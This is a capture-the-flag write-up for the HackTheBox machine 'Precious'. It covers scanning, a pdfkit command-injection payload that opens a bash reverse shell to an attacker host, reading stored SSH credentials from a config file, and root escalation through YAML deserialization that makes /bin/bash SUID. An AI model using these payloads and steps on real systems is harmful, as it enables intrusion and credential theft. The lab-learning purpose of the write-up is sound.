### Introduction

[Precious] is an easy CTF machine on HackTheBox focused on exploiting a **pdfkit** vulnerability and exploiting a **YAML Deserialization**.

Let's start scanning the machine with nmap.

```sh
nmap -sSV -p- --open --min-rate 5000 <IP> -oN <outputfile.txt>
```

We can see there are 2 ports open, 22(ssh) and 80(http).

![scan](/images/HTB/precious/Captura.PNG)

Like we can see, we need to put the machine IP in our **/etc/hosts** file for works.

![web](/images/HTB/precious/Captura2.PNG)

```sh
nano /etc/hosts
or
echo '<IP> precious.htb' >> /etc/hosts
```

![hosts](/images/HTB/precious/Captura3.PNG)

Now we can see a **Web Page to PDF converter** in the site.

Let's open a python server to see if it makes a petition.

```sh
python3 -m http.server 80
```


![python server](/images/HTB/precious/Captura5.PNG)

Like we can see the server make a get petition.

Time to see the PDF metadata.

```sh
exiftool <pdf file>
```

Looking It we found some interesting in **Creator** part because It notices to us how it was Generated, and It is generated with **pdfkit**.

![exiftool pdf](/images/HTB/precious/Captura7.PNG)

If we research a little, we can found some interesting things about **pdfkit** version that is vulnerable.

![pdfkit search](/images/HTB/precious/Captura8.PNG)

There is vulnerable a **[Command Injection]** and if We read a little about it, We can make a payload to get a reverse shell with it.

![vuln](/images/HTB/precious/Captura9.PNG)

Time to prepare our listener.

```sh
nc -lvnp <port>
```

![netcat listener](/images/HTB/precious/Captura10.PNG)

And now let's submit the payload in the Web page to get our shell.

```sh
http://example.com/?name=#{'%20`bash -c "bash -i >& /dev/tcp/<IP>/<Port> 0>&1"`'}
```

![payload](/images/HTB/precious/Captura11.PNG)

If all was correct we will get a shell in the machine.

Now is time to look around a little.

We can see an interesting directory called **.bundle**

Inner It we can found the user **henry** credentials.

```sh
cd /home/ruby
ls -la
cd .bundle
ls -la
cat config
```

![henry creds](/images/HTB/precious/Captura13.PNG)

Time to connect to the machine with the credentials.  

```sh
ssh henry@precious.htb
```

![ssh](/images/HTB/precious/Captura14.PNG)

Once in the machine, We can see the user flag.

```sh
ls -la
cat user.txt
```

![user flag](/images/HTB/precious/Captura15.PNG)

- User Flag

Time to elevate our privileges!

If we look **sudo -l** we can run like root with no password the **ruby update_dependencies**.

```sh
sudo -l
```

![sudo -l](/images/HTB/precious/Captura16.PNG)

Looking the file, We can see that in a part read **dependencies.yml**.

```sh
cat /opt/update_dependencies.rb
```

So we can take advantage of this!

![cat update](/images/HTB/precious/Captura17.PNG)

Let's create a file with this [example] to abuse these permissions.

```sh
nano dependencies.yml
```

What We're going to do is change the /bin/bash permissions to make it SUID binary and get a root shell.

![file dependencies](/images/HTB/precious/Captura18.PNG)

Let's execute it.

```sh
sudo ruby /opt/update_dependencies.rb
```

![execute update](/images/HTB/precious/Captura19.PNG)

If all worked correctly, the binary now is SUID, and We can execute it and get our privilege escalation.

```sh
ls -l /bin/bash
```

![/bin/bash perms](/images/HTB/precious/Captura20.PNG)

It worked well so It's time to execute it.

```sh
bash -p
id
```

![user to root](/images/HTB/precious/Captura21.PNG)

Now We're root and can see the root flag.

```sh
cd /root/
cat root.txt
```

![root flag](/images/HTB/precious/Captura22.PNG)

- Root Flag
